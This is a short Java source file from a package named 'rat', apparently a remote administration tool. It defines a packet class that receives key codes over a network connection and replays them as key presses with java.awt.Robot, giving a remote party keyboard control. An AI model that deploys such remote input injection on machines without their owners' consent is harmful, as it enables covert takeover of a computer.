/*
 * Copyright 2016 Johannes Boczek
 */

package de.sogomn.rat.packet;

import java.awt.AWTException;
import java.awt.Robot;
import java.awt.event.KeyEvent;

import de.sogomn.rat.ActiveConnection;

public final class KeyEventPacket implements IPacket {
	
	private int key;
	private byte strokeType;
	
	public static final byte PRESS = 0;
	public static final byte RELEASE = 1;
	public static final byte TYPE = 2;
	
	public KeyEventPacket(final int key, final byte strokeType) {
		this.key = key;
		this.strokeType = strokeType;
	}
	
	public KeyEventPacket() {
		this(KeyEvent.VK_UNDEFINED, TYPE);
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeInt(key);
		connection.writeByte(strokeType);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		key = connection.readInt();
		strokeType = connection.readByte();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		try {
			final Robot rob = new Robot();
			
			if (strokeType == PRESS) {
				rob.keyPress(key);
			} else if (strokeType == RELEASE) {
				rob.keyRelease(key);
			} else if (strokeType == TYPE) {
				rob.keyPress(key);
				rob.keyRelease(key);
			}
		} catch (final IllegalArgumentException ex) {
			System.err.println("No valid key code");
		} catch (final AWTException ex) {
			ex.printStackTrace();
		}
	}
	
}
